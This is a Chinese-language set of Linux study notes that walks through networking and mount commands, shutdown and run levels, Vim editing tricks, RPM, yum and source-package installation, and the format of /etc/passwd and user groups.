<h4 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h4><p>命令名称: netstat<br>命令所在路径: /bin/netstat<br>执行权限: 所有用户<br>语法: netstat [选项]<br>    -a  全部信息<br>    -t  TCP协议<br>    -u  UDP协议<br>    -l  监听<br>    -r  路由(网关)<br>    -n  显示IP地址和端口号<br>功能描述: 显示网络相关信息<br>范例:<br>    netstat -tlun       查看本机监听的端口<br>    netstat -an          查看本机所有的网络连接<br>    netstat -rn           查看本机路由表</p>
<h4 id="setup命令-red-hat专有"><a href="#setup命令-red-hat专有" class="headerlink" title="setup命令(red hat专有)"></a>setup命令(red hat专有)</h4><p>命令名称: setup<br>命令所在路径: /usr/bin/setup<br>执行权限: root<br>语法: setup<br>功能描述:配置网络</p>
<h4 id="mount命令"><a href="#mount命令" class="headerlink" title="mount命令"></a>mount命令</h4><p>命令名称: mount<br>命令位置: /bin/mount<br>执行权限: 所有用户<br>命令语法: mount [-t 文件系统] 设备文件名 挂载点<br>功能描述: 挂载设备<br>范例: mount -t iso9660 /dev/sr0 /mnt/cdrom</p>
<h4 id="umount命令"><a href="#umount命令" class="headerlink" title="umount命令"></a>umount命令</h4><p>命令名称: umount<br>命令位置: /bin/umount<br>执行权限: 所有用户<br>命令语法: umount 设备文件名<br>功能描述: 卸载设备<br>范例: umount /dev/sr0</p>
<h3 id="关机重启命令"><a href="#关机重启命令" class="headerlink" title="关机重启命令"></a>关机重启命令</h3><h4 id="shutdown命令"><a href="#shutdown命令" class="headerlink" title="shutdown命令"></a>shutdown命令</h4><p>命令名称: shutdown<br>命令语法: shutdown [选项] 时间<br>    -c  取消前一个关机命令<br>    -h  关机<br>    -r  重启<br>功能描述: 关机重启<br>范例:<br>shutdown -h now   现在关机<br>shutdown -r 12:00   12:00重启<br>shutdown -c    取消前一个关机命令</p>
<h4 id="halt命令"><a href="#halt命令" class="headerlink" title="halt命令"></a>halt命令</h4><p>命令名称: halt<br>命令语法: halt<br>功能描述: 关机</p>
<h4 id="poweroff命令"><a href="#poweroff命令" class="headerlink" title="poweroff命令"></a>poweroff命令</h4><p>命令名称: poweroff<br>命令语法: poweroff<br>功能描述: 关机</p>
<p>相当于直接断电</p>
<h4 id="init-0命令"><a href="#init-0命令" class="headerlink" title="init 0命令"></a>init 0命令</h4><p>命令名称: init 0<br>命令语法: init 0<br>功能描述: 关机</p>
<h4 id="reboot命令"><a href="#reboot命令" class="headerlink" title="reboot命令"></a>reboot命令</h4><p>命令名称: reboot<br>命令语法: reboot<br>功能描述: 重启</p>
<h4 id="init-6命令"><a href="#init-6命令" class="headerlink" title="init 6命令"></a>init 6命令</h4><p>命令名称: init 6<br>命令语法: init 6<br>功能描述: 重启</p>
<h4 id="logout命令"><a href="#logout命令" class="headerlink" title="logout命令"></a>logout命令</h4><p>命令名称: logout<br>命令语法: logout<br>功能描述: 退出登录</p>
<h4 id="系统运行级别"><a href="#系统运行级别" class="headerlink" title="系统运行级别"></a>系统运行级别</h4><p>0  关机<br>1  单用户(root用户,与windows下安全模式类似,启动最少的核心程序进行修复)(无图形界面)<br>2  不完全多用户,不含NFS(网络文件系统)服务(NFS不太安全)(无图形界面)<br>3  完全多用户(无图形界面)<br>4  未分配<br>5  图形界面(X)<br>6  重启</p>
<h5 id="查看运行级别相关信息"><a href="#查看运行级别相关信息" class="headerlink" title="查看运行级别相关信息"></a>查看运行级别相关信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;inittab</span><br></pre></td></tr></table></figure>
<h5 id="查询系统当前运行级别"><a href="#查询系统当前运行级别" class="headerlink" title="查询系统当前运行级别"></a>查询系统当前运行级别</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runlevel</span><br></pre></td></tr></table></figure>
<h2 id="文本编辑器Vim"><a href="#文本编辑器Vim" class="headerlink" title="文本编辑器Vim"></a>文本编辑器Vim</h2><p>Vim是一个功能强大的全屏幕文本编辑器,是Linux/UNIX上最常用的文本编辑器,它的作用是建立、编辑、显示文本文件.Vim没有菜单,只有命令.</p>
<p>Vim工作模式分为命令模式,插入模式和编辑模式.</p>
<h3 id="Vim常用命令"><a href="#Vim常用命令" class="headerlink" title="Vim常用命令"></a>Vim常用命令</h3><h4 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>在光标所在字符后插入</td>
</tr>
<tr>
<td>A</td>
<td>在光标所在行行尾插入</td>
</tr>
<tr>
<td>i</td>
<td>在光标所在字符前插入</td>
</tr>
<tr>
<td>I</td>
<td>在光标所在行行首插入</td>
</tr>
<tr>
<td>o</td>
<td>在光标下插入新行</td>
</tr>
<tr>
<td>O</td>
<td>在光标上插入新行</td>
</tr>
</tbody>
</table>
</div>
<h4 id="定位命令"><a href="#定位命令" class="headerlink" title="定位命令"></a>定位命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>:set nu</td>
<td>设置行号</td>
</tr>
<tr>
<td>:set nonu</td>
<td>取消行号</td>
</tr>
<tr>
<td>gg<br />G</td>
<td>到第一行<br />到最后一行</td>
</tr>
<tr>
<td>nG</td>
<td>到第n行</td>
</tr>
<tr>
<td>:n</td>
<td>到第n行</td>
</tr>
<tr>
<td>$</td>
<td>移至行尾</td>
</tr>
<tr>
<td>0</td>
<td>移至行首</td>
</tr>
</tbody>
</table>
</div>
<h4 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>x</td>
<td>删除光标所在处字符</td>
</tr>
<tr>
<td>nx</td>
<td>删除光标所在处后n个字符</td>
</tr>
<tr>
<td>dd</td>
<td>删除光标所在行,ndd删除n行</td>
</tr>
<tr>
<td>dG</td>
<td>删除光标所在行到文件末尾内容</td>
</tr>
<tr>
<td>D</td>
<td>删除光标所在处到行尾内容</td>
</tr>
<tr>
<td>:x,yd</td>
<td>删除指定范围(x行到y行)的行</td>
</tr>
</tbody>
</table>
</div>
<h4 id="复制和剪切命令"><a href="#复制和剪切命令" class="headerlink" title="复制和剪切命令"></a>复制和剪切命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>yy</td>
<td>复制当前行</td>
</tr>
<tr>
<td>nyy</td>
<td>复制当前行(包括当前行)以下n行</td>
</tr>
<tr>
<td>dd</td>
<td>剪切当前行</td>
</tr>
<tr>
<td>ndd</td>
<td>剪切当前行(包括当前行)以下n行</td>
</tr>
<tr>
<td>p<br />P</td>
<td>粘贴在当前光标所在行下(p)<br />粘贴在当前光标所在行上(P)</td>
</tr>
</tbody>
</table>
</div>
<h4 id="替换和取消命令"><a href="#替换和取消命令" class="headerlink" title="替换和取消命令"></a>替换和取消命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>取代光标所在处字符</td>
</tr>
<tr>
<td>R</td>
<td>从光标所在处开始替换字符,按Esc结束</td>
</tr>
<tr>
<td>u</td>
<td>取消上一步操作</td>
</tr>
</tbody>
</table>
</div>
<h4 id="搜索和搜索替换命令"><a href="#搜索和搜索替换命令" class="headerlink" title="搜索和搜索替换命令"></a>搜索和搜索替换命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>/string</td>
<td>搜索指定字符串,搜索时忽略大小写:set ic(不忽略大小写:set noic)</td>
</tr>
<tr>
<td>n</td>
<td>搜索指定字符串的下一个出现位置</td>
</tr>
<tr>
<td>:%s/要被替换的字符串/新的字符串</td>
<td>全文替换指定字符串</td>
</tr>
<tr>
<td>:起始行,终止行s/要被替换的字符串/新的字符串</td>
<td>在一定范围内替换指定字符串</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:%s&#x2F;world&#x2F;世界&#x2F;g      &#x2F;&#x2F;在全文范围内,将world替换为世界(g表示不询问,c表示询问确认)</span><br><span class="line">:3,6s&#x2F;world&#x2F;世界&#x2F;c    &#x2F;&#x2F;在3到6行,将world替换为世界(&#x2F;g或&#x2F;c可加可不加)</span><br></pre></td></tr></table></figure>
<h4 id="保存和退出命令"><a href="#保存和退出命令" class="headerlink" title="保存和退出命令"></a>保存和退出命令</h4><div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>:w</td>
<td>保存修改</td>
</tr>
<tr>
<td>:w filename</td>
<td>另存为指定文件(可指定为某路径下的某文件)</td>
</tr>
<tr>
<td>:wq</td>
<td>保存修改并退出</td>
</tr>
<tr>
<td>ZZ</td>
<td>快捷键,保存修改并退出</td>
</tr>
<tr>
<td>:q!</td>
<td>不保存修改退出</td>
</tr>
<tr>
<td>:wq!</td>
<td>(只读文件强行保存)保存修改并退出(文件所有者及root可使用)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Vim使用技巧"><a href="#Vim使用技巧" class="headerlink" title="Vim使用技巧"></a>Vim使用技巧</h3><h4 id="导入外部文件"><a href="#导入外部文件" class="headerlink" title="导入外部文件"></a>导入外部文件</h4><p>:r 文件位置   //导入文件到当前vim编辑的文件中</p>
<p><img src="https://i.loli.net/2021/01/31/THdxuBQmOfvpUSL.gif" alt=""></p>
<h4 id="不退出vim使用linux命令"><a href="#不退出vim使用linux命令" class="headerlink" title="不退出vim使用linux命令"></a>不退出vim使用linux命令</h4><p>:!命令      //不退出vim的情况下使用linux命令</p>
<p><img src="https://i.loli.net/2021/01/31/H71X9uAtVwZ5qkm.gif" alt=""></p>
<h4 id="将命令执行结果导入当前编辑文件"><a href="#将命令执行结果导入当前编辑文件" class="headerlink" title="将命令执行结果导入当前编辑文件"></a>将命令执行结果导入当前编辑文件</h4><p>:r !date(或其他命令)        //直接将date命令执行结果导入当前编辑文件   </p>
<p><img src="https://i.loli.net/2021/01/31/SNU56oP18fD3mrz.gif" alt=""></p>
<h4 id="自定义快捷键-单行注释"><a href="#自定义快捷键-单行注释" class="headerlink" title="自定义快捷键(单行注释)"></a>自定义快捷键(单行注释)</h4><p>:map 快捷键 触发命令   //自定义快捷键</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:map Ctrl+p I#&lt;ESC&gt;     &#x2F;&#x2F;将在首行(I)添加#并退出插入模式(ESC)设置为快捷键Ctrl+p</span><br><span class="line">:map Ctrl+b 0x          &#x2F;&#x2F;将光标移至行首并删除行首字符设置为快捷键Ctrl+b</span><br></pre></td></tr></table></figure>
<h4 id="连续行注释"><a href="#连续行注释" class="headerlink" title="连续行注释"></a>连续行注释</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:2,5s&#x2F;^&#x2F;#&#x2F;g        &#x2F;&#x2F;(类似于前面的替换)将2至5行的行首(^)增加#(g表示不询问)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/31/yZJ6P3qH5NMKYef.gif" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:2,5s&#x2F;#&#x2F;&#x2F;g         &#x2F;&#x2F;将2至5行中所有#删除</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/31/n6IDdh45UkPYMgF.gif" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:2,5s&#x2F;^#&#x2F;&#x2F;g         &#x2F;&#x2F;将2至5行的行首的所有#删除</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/31/K9jXRYPFkE5VTJ2.gif" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:2,5s&#x2F;^&#x2F;\&#x2F;\&#x2F;&#x2F;g     &#x2F;&#x2F;将2至5行的行首添加双斜杠(&#x2F;&#x2F;),其中\&#x2F;代表一个斜杠(转义)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/31/FYnkzh5iDVHycZK.gif" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:2,5s&#x2F;^\&#x2F;\&#x2F;&#x2F;&#x2F;g    &#x2F;&#x2F;将2至5行的行首的双斜杠(&#x2F;&#x2F;)删除</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/31/2itGncOdUS965N3.gif" alt=""></p>
<h4 id="文本替换"><a href="#文本替换" class="headerlink" title="文本替换"></a>文本替换</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ab mymail 5201314@qq.com   &#x2F;&#x2F;在文件中输入mymail,空格或回车后会自动替换为5201314@qq.com </span><br></pre></td></tr></table></figure>
<h2 id="软件包管理"><a href="#软件包管理" class="headerlink" title="软件包管理"></a>软件包管理</h2><h3 id="软件包管理简介"><a href="#软件包管理简介" class="headerlink" title="软件包管理简介"></a>软件包管理简介</h3><h4 id="软件包分类"><a href="#软件包分类" class="headerlink" title="软件包分类"></a>软件包分类</h4><ul>
<li>源码包(绝大多数是C语言)<ol>
<li>脚本安装包</li>
</ol>
</li>
<li>经过编译后的二进制包(RPM包,系统默认包)(现在更常用)</li>
</ul>
<h5 id="源码包"><a href="#源码包" class="headerlink" title="源码包"></a>源码包</h5><p>源码包的优点:</p>
<ul>
<li>开源,如果有足够的能力,可以修改源代码</li>
<li>可以自由选择所需的功能</li>
<li>软件是编译安装,所以更加适合自己的系统,更加稳定也效率更高</li>
<li>卸载方便(直接删除源码包)</li>
</ul>
<p>源码包的缺点:</p>
<ul>
<li>安装过程步骤较多,尤其安装较大的软件集合时( 如LAMP环境搭建),容易出现拼写错误</li>
<li>编译过程时间较长,安装比二进制包安装时间长</li>
<li>因为是编译安装,安装过程中一旦报错新手很难解决</li>
</ul>
<h5 id="二进制包"><a href="#二进制包" class="headerlink" title="二进制包"></a>二进制包</h5><p>二进制包的优点:</p>
<ul>
<li>包管理系统简单,只通过几个命令就可以实现包的安装、升级、查询和卸载</li>
<li>安装速度比源码包安装快的多</li>
</ul>
<p>二进制包的缺点:</p>
<ul>
<li>经过编译,不再可以看到源代码</li>
<li>功能选择不如源码包灵活</li>
<li>依赖性</li>
</ul>
<h3 id="RPM包管理"><a href="#RPM包管理" class="headerlink" title="RPM包管理"></a>RPM包管理</h3><h4 id="rpm命令管理"><a href="#rpm命令管理" class="headerlink" title="rpm命令管理"></a>rpm命令管理</h4><h5 id="包命名与依赖"><a href="#包命名与依赖" class="headerlink" title="包命名与依赖"></a>包命名与依赖</h5><h6 id="RPM包命名规则"><a href="#RPM包命名规则" class="headerlink" title="RPM包命名规则"></a>RPM包命名规则</h6><p>httpd-2.2.15-15.el6.centos.1.i686.rpm(包全名)<br>httpd          软件包名<br>2.2.15         软件版本<br>15                软件发布的次数<br>el6.centos  适合的Linux平台<br>i686             适合的硬件平台<br>rpm              rpm包扩展名</p>
<h6 id="RPM包依赖性"><a href="#RPM包依赖性" class="headerlink" title="RPM包依赖性"></a>RPM包依赖性</h6><ul>
<li>树形依赖: a-&gt;b-&gt;c</li>
<li>环形依赖: a-&gt;b-&gt;c-&gt;a(同时装即可)</li>
<li>模块依赖: <a href="https://www.rpmfind.net">模块依赖查询网站</a></li>
</ul>
<h5 id="安装升级与卸载"><a href="#安装升级与卸载" class="headerlink" title="安装升级与卸载"></a>安装升级与卸载</h5><h6 id="RPM包安装"><a href="#RPM包安装" class="headerlink" title="RPM包安装"></a>RPM包安装</h6><p>rpm -ivh 包全名</p>
<p>选项:<br>    -i (install)      安装<br>    -v (verbose)   显示详细信息<br>    -h (hash)        显示进度<br>    --nodeps        不检查依赖性</p>
<h6 id="RPM包升级"><a href="#RPM包升级" class="headerlink" title="RPM包升级"></a>RPM包升级</h6><p>rpm -Uvh 包全名</p>
<p>选项:<br>    -U (upgrade)      升级</p>
<h6 id="RPM包卸载"><a href="#RPM包卸载" class="headerlink" title="RPM包卸载"></a>RPM包卸载</h6><p>rpm -e 包名</p>
<p>选项:<br>    -e (erase)      卸载<br>    --nodeps       不检查依赖性</p>
<h5 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h5><h6 id="查询是否安装"><a href="#查询是否安装" class="headerlink" title="查询是否安装"></a>查询是否安装</h6><p>rpm -q 包名</p>
<p>选项:<br>    -q (query)      查询</p>
<p>rpm -qa</p>
<p>选项:<br>    -a (all)            全部</p>
<h6 id="查询软件包详细信息"><a href="#查询软件包详细信息" class="headerlink" title="查询软件包详细信息"></a>查询软件包详细信息</h6><p>rpm -qi 包名</p>
<p>选项:<br>    -i (information)      查询软件信息</p>
<p>rpm -qp 包全名</p>
<p>选项:<br>    -p (package)            查询未安装包信息 </p>
<h6 id="查询包中文件安装位置"><a href="#查询包中文件安装位置" class="headerlink" title="查询包中文件安装位置"></a>查询包中文件安装位置</h6><p>rpm -ql 包名</p>
<p>选项:<br>    -l (list)      查询文件安装位置列表</p>
<p>rpm -qlp 包全名</p>
<p>选项:<br>    -p (package)            查询未安装包的默认安装位置</p>
<h6 id="查询系统文件属于哪个RPM包"><a href="#查询系统文件属于哪个RPM包" class="headerlink" title="查询系统文件属于哪个RPM包"></a>查询系统文件属于哪个RPM包</h6><p>rpm -qf 系统文件名</p>
<p>选项:<br>    -f (file)            查询系统文件属于哪个RPM包</p>
<h6 id="查询软件包的依赖性"><a href="#查询软件包的依赖性" class="headerlink" title="查询软件包的依赖性"></a>查询软件包的依赖性</h6><p>rpm -q[p]R 包名[包全名]</p>
<p>选项:<br>    -R (requires)            查询软件包的依赖性<br>    -p (package)             查询未安装包的依赖性</p>
<h5 id="校验和文件提取"><a href="#校验和文件提取" class="headerlink" title="校验和文件提取"></a>校验和文件提取</h5><h6 id="RPM包校验"><a href="#RPM包校验" class="headerlink" title="RPM包校验"></a>RPM包校验</h6><p>判断系统文件是否更改</p>
<p>rpm -V 包名</p>
<p>选项:<br>    -V (verify)            校验指定RPM包中的文件</p>
<p>验证内容中的8个信息的具体内容如下:</p>
<ul>
<li>S  文件大小是否改变</li>
<li>M  文件的类型或文件的权限(rwx) 是否被改变</li>
<li>5    文件MD5校验和是否改变(可以看成文件内容是否<br>改变)</li>
<li>D  设备的主从代码是否改变</li>
<li>L  文件路径是否改变</li>
<li>U  文件的属主(所有者)是否改变</li>
<li>G  文件的属组是否改变</li>
<li>T  文件的修改时间是否改变</li>
</ul>
<p>文件类型:</p>
<ul>
<li>c  配置文件(config file)</li>
<li>d  普通文档(documentation)</li>
<li>g  “鬼”文件(ghost file),很少见,就是该文件不应该被这个RPM包包含</li>
<li>l  授权文件(license file)</li>
<li>r  描述文件(read me)</li>
</ul>
<h6 id="RPM包中文件提取"><a href="#RPM包中文件提取" class="headerlink" title="RPM包中文件提取"></a>RPM包中文件提取</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm2cpio 包全名 | \ cpio -idv .文件绝对路径</span><br></pre></td></tr></table></figure>
<p>“\\”代表一条命令没有输入完,(太长了)换行;”.”代表把指定路径的文件提取到当前路径下;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rmp2cpio &#x2F;mnt&#x2F;cdrom&#x2F;Package&#x2F;coreutils-8.4-19.el6.i686.rpm | cpio -idv .&#x2F;bin&#x2F;ls</span><br><span class="line">&#x2F;&#x2F;提取RPM包中ls命令到当前目录的&#x2F;bin&#x2F;ls下</span><br></pre></td></tr></table></figure>
<p>rpm2cpio     //将rpm包转换为cpio格式的命令</p>
<p>cpio    //是一个标准工具,它用于创建软件档案文件和从档案文件中提取文件</p>
<p>cpio 选项 &lt;[文件/设备]</p>
<p>选项:<br>    -i   copy-in模式,还原<br>    -d  还原时自动新建目录<br>    -v  显示还原过程<br>    &lt;    输入重定向</p>
<h4 id="yum在线管理"><a href="#yum在线管理" class="headerlink" title="yum在线管理"></a>yum在线管理</h4><h5 id="网络yum源"><a href="#网络yum源" class="headerlink" title="网络yum源"></a>网络yum源</h5><ul>
<li>[base]    容器名称,一定要放在[]中</li>
<li>name    容器说明,可以自己随便写</li>
<li>mirrorlist    镜像站点,这个可以注释掉</li>
<li>baseurl    yum源服务器的地址(为http)</li>
<li>enabled    此容器是否生效,如果不写或写成enable=1都是生效,写成enable=0就是不生效</li>
<li>gpgcheck    如果是1则指RPM的数字证书生效,如果是0则不生效</li>
<li>gpgkey    数字证书的公钥文件保存位置.不用修改</li>
</ul>
<h5 id="yum命令"><a href="#yum命令" class="headerlink" title="yum命令"></a>yum命令</h5><h6 id="查询-1"><a href="#查询-1" class="headerlink" title="查询"></a>查询</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum list           &#x2F;&#x2F;查询所有可用软件包列表</span><br><span class="line">yum search 关键字   &#x2F;&#x2F;搜索服务器上所有和关键字相关的包</span><br></pre></td></tr></table></figure>
<h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install 包名</span><br></pre></td></tr></table></figure>
<p>选项:<br>    -y  自动回答yes</p>
<h6 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y update 包名   &#x2F;&#x2F;不加包名时,升级所有软件包(包括linux内核,linux内核升级完成后需要在本地做一定的配置才能正常使用)</span><br></pre></td></tr></table></figure>
<h6 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y remove 包名</span><br></pre></td></tr></table></figure>
<p>尽量不卸载</p>
<h6 id="yum软件组管理命令"><a href="#yum软件组管理命令" class="headerlink" title="yum软件组管理命令"></a>yum软件组管理命令</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum grouplist             &#x2F;&#x2F;列出所有可用的软件组列表</span><br><span class="line">yum groupinstall 软件组名  &#x2F;&#x2F;安装指定软件组,组名可以由group1ist查询出来(如果组名有空格,用双引号括起来)</span><br><span class="line">yum groupremove 软件组名   &#x2F;&#x2F;卸载指定软件组</span><br></pre></td></tr></table></figure>
<h5 id="光盘yum源搭建"><a href="#光盘yum源搭建" class="headerlink" title="光盘yum源搭建"></a>光盘yum源搭建</h5><p>1.挂载光盘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount &#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom</span><br></pre></td></tr></table></figure>
<p>2.让网络yum源文件失效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;yum&#x2F;repos.d&#x2F;</span><br><span class="line">将yum源文件(除了Centos-Meidia.repo)中改为enable&#x3D;0;或者将它们改名</span><br></pre></td></tr></table></figure>
<p>3.修改光盘yum源文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim Centos-Meidia.repo</span><br><span class="line">将baseurl&#x3D;http:&#x2F;&#x2F;修改baseurl&#x3D;file:&#x2F;&#x2F;光盘挂载的绝对路径</span><br><span class="line">注释多余的file:&#x2F;&#x2F;&#x2F;路径(不存在的地址)</span><br><span class="line">设置enable&#x3D;1</span><br></pre></td></tr></table></figure>
<h3 id="源码包管理"><a href="#源码包管理" class="headerlink" title="源码包管理"></a>源码包管理</h3><h4 id="源码包和RPM包的区别"><a href="#源码包和RPM包的区别" class="headerlink" title="源码包和RPM包的区别"></a>源码包和RPM包的区别</h4><ul>
<li>安装之前的区别: 概念上的区别</li>
<li>安装之后的区别: 安装位置不同</li>
</ul>
<h5 id="RPM包安装位置"><a href="#RPM包安装位置" class="headerlink" title="RPM包安装位置"></a>RPM包安装位置</h5><p>默认安装路径(绝大多数):</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>路径</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>/etc/</td>
<td>配置文件安装目录</td>
</tr>
<tr>
<td>/usr/bin/</td>
<td>可执行的命令安装目录</td>
</tr>
<tr>
<td>/usr/lib/</td>
<td>程序所使用的函数库保存位置</td>
</tr>
<tr>
<td>/usr/share/doc/</td>
<td>基本的软件使用手册保存位置</td>
</tr>
<tr>
<td>/usr/share/man/</td>
<td>帮助文件保存位置</td>
</tr>
</tbody>
</table>
</div>
<h5 id="源码包安装位置"><a href="#源码包安装位置" class="headerlink" title="源码包安装位置"></a>源码包安装位置</h5><p>安装在指定位置当中,一般是/usr/loca1/软件名/</p>
<h5 id="安装位置不同带来的影响"><a href="#安装位置不同带来的影响" class="headerlink" title="安装位置不同带来的影响"></a>安装位置不同带来的影响</h5><p>RPM包安装的服务可以使用系统服务管理命令(service)来管理,例如RPM包安装的apache的启动方法是:</p>
<ol>
<li>/etc/rc.d/init.d/httpd start    (方法1)</li>
<li>service httpd start    (方法2)</li>
</ol>
<p>而源码包安装的服务则不能被服务管理命令管理,因为没有安装到默认路径中.所以只能用绝对路径进行服务的管理,如:</p>
<ul>
<li>/usr/1oca1/apache2/bin/apachectl start</li>
</ul>
<h4 id="源码包安装过程"><a href="#源码包安装过程" class="headerlink" title="源码包安装过程"></a>源码包安装过程</h4><p>RPM包安装和源码包安装并不冲突(以apache为例)</p>
<h5 id="1-安装准备"><a href="#1-安装准备" class="headerlink" title="1.安装准备"></a>1.安装准备</h5><ol>
<li>安装gcc编译器</li>
<li>下载源码包</li>
</ol>
<h5 id="2-安装注意事项"><a href="#2-安装注意事项" class="headerlink" title="2.安装注意事项"></a>2.安装注意事项</h5><ul>
<li>源代码保存位置: /usr/local/src/</li>
<li>软件安装位置: /usr/local/</li>
<li>如何确定安装过程报错:<ul>
<li>安装过程停止</li>
<li>并出现error、warning或no的提示</li>
</ul>
</li>
</ul>
<h5 id="3-源码包安装过程"><a href="#3-源码包安装过程" class="headerlink" title="3.源码包安装过程"></a>3.源码包安装过程</h5><ol>
<li><p>解压下载的源码包</p>
</li>
<li><p>进入解压目录(INSTALL是安装说明,README是使用说明)</p>
</li>
<li><p>./configure —prefix=/usr/local/apache2(指定安装路径)</p>
<p>./configure  软件配置与检查</p>
<ul>
<li>定义需要的功能选项</li>
<li>检测系统环境是否符合安装要求</li>
<li>把定义好的功能选项和检测系统环境的信息都写入Makefile文件,用于后续的编辑</li>
</ul>
</li>
<li><p>make    编译</p>
</li>
<li><p>make install   编译安装(向真正的安装目录写入数据)</p>
</li>
<li><p>/usr/1oca1/apache2/bin/apachectl start    启动</p>
</li>
</ol>
<p>./configure和make都不会向真正的指定安装位置写任何数据,如果这两步报错不用删除软件包,只需执行make clean,清空编译产生的临时文件</p>
<h4 id="源码包的卸载"><a href="#源码包的卸载" class="headerlink" title="源码包的卸载"></a>源码包的卸载</h4><p>不需要卸载命令,直接删除安装目录即可,不会遗留任何垃圾文件.</p>
<h3 id="脚本安装包"><a href="#脚本安装包" class="headerlink" title="脚本安装包"></a>脚本安装包</h3><h4 id="脚本安装包简介"><a href="#脚本安装包简介" class="headerlink" title="脚本安装包简介"></a>脚本安装包简介</h4><ul>
<li>脚本安装包并不是独立的软件包类型,常见安装的是源码包</li>
<li>是人为把安装过程写成了自动安装的脚本,只要执行脚本,定义简单的参数,就可以完成安装</li>
<li>非常类似于Windows下软件的安装方式</li>
<li>主要是安装驱动</li>
</ul>
<h4 id="脚本安装包安装过程"><a href="#脚本安装包安装过程" class="headerlink" title="脚本安装包安装过程"></a>脚本安装包安装过程</h4><ol>
<li>下载脚本安装包</li>
<li>解压脚本安装包</li>
<li>进入解压目录</li>
<li>./setup.sh</li>
<li>可能会询问一些可选的选项(回车-&gt;默认),Ctrl+退格删除输入错误的字符</li>
</ol>
<h2 id="用户和用户组管理"><a href="#用户和用户组管理" class="headerlink" title="用户和用户组管理"></a>用户和用户组管理</h2><h3 id="用户配置文件"><a href="#用户配置文件" class="headerlink" title="用户配置文件"></a>用户配置文件</h3><h4 id="用户管理简介"><a href="#用户管理简介" class="headerlink" title="用户管理简介"></a>用户管理简介</h4><ul>
<li>越是对安全性要求高的服务器,越需要建立合理的用户权限等级制度和服务器操作规范</li>
<li>在Linux中主要是通过用户配置文件来查看和修改用户信息</li>
</ul>
<h4 id="用户信息文件"><a href="#用户信息文件" class="headerlink" title="用户信息文件"></a>用户信息文件</h4><p>用户信息文件/etc/passwd(使用man 5 passwd查看[注意:是文件名而不是绝对路径])(用冒号分开),7个字段</p>
<ol>
<li>第1字段: 用户名称</li>
<li>第2字段: 密码标志(x表示有密码,否则只允许本机登录,禁用ssh)</li>
<li><p>第3字段: UID (用户ID)</p>
<ul>
<li>0: 超级用户</li>
<li>1-499:系统用户(伪用户,不能登录,不能删除)</li>
<li>500-65535:普通用户</li>
</ul>
</li>
<li>第4字段: GID (用户初始组ID)</li>
<li>第5字段: 用户说明(备注)</li>
<li>第6字段: 家目录<ul>
<li>普通用户: /home/用户名/</li>
<li>超级用户: /root/</li>
</ul>
</li>
<li>第7字段: 登录之后的Shell</li>
</ol>
<h5 id="初始组和附加组"><a href="#初始组和附加组" class="headerlink" title="初始组和附加组"></a>初始组和附加组</h5><ul>
<li>初始组:就是指用户一登录就立刻拥有这个用户组的相关权限,每个用户的初始组必须有且只能有一个,一般就是和这个用户的用户名相同的组名作为这个用户的初始组</li>
<li>附加组:指用户可以加入多个其他的用户组,并拥有这些组的权限,附加组可以有多个</li>
</ul>
